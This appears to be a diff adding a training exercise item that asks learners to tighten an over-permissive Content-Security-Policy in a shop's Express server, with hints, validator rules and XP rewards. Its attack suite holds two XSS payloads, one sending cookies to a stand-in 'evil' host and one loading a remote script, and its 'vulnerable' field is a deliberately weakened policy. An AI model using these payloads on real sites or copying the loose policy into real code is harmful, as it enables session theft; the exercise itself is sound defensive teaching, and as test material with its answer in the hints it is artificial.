@@ -1,0 +1,50 @@
+{
+  "id": "harden-201",
+  "title": "The content security policy lets injected scripts straight through",
+  "skill": "xss",
+  "subSkill": "xss.csp",
+  "tier": "intermediate",
+  "format": "harden",
+  "validator": "ast-diff",
+  "repo": "aurora-store",
+  "file": "server/security.js",
+  "reportedBy": "Dan (QA)",
+  "masteryRequired": 0.45,
+  "isDrill": false,
+  "isBoss": false,
+  "requires": "sec-204",
+  "brief": "Aurora sends a Content-Security-Policy, which should mean an injected <script> is refused even if an XSS bug slips through. Dan's payloads still run. Someone loosened the policy until the site stopped complaining, and in doing so switched it off for exactly the attack it exists to stop.",
+  "vulnerable": "app.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      scriptSrc: [\"'self'\", \"'unsafe-inline'\", \"*\"],\n      imgSrc: [\"'self'\", \"https://cdn.aurora.shop\"]\n    }\n  }\n}));",
+  "meta": {},
+  "rules": [
+    "csp.enabled",
+    "csp.no-unsafe-sources",
+    "csp.allows-own-scripts"
+  ],
+  "attackSuite": [
+    {
+      "payload": "<script>fetch('//evil/'+document.cookie)</script>",
+      "label": "An inline script"
+    },
+    {
+      "payload": "<script src=\"https://evil.example/x.js\"></script>",
+      "label": "A script from anywhere"
+    }
+  ],
+  "functionalSuite": [
+    {
+      "value": "/static/app.js",
+      "label": "Aurora's own bundle still loads"
+    }
+  ],
+  "hints": [
+    "A policy is only as strict as its loosest source. Which sources in scriptSrc would an attacker be delighted to see?",
+    "Turning the policy off, or blocking every script, both 'fix' the warning. Only one of them leaves a working shop.",
+    "Keep 'self' and remove 'unsafe-inline' and *."
+  ],
+  "xp": {
+    "firstAttempt": 110,
+    "withHints": 55,
+    "retry": 35
+  }
+}
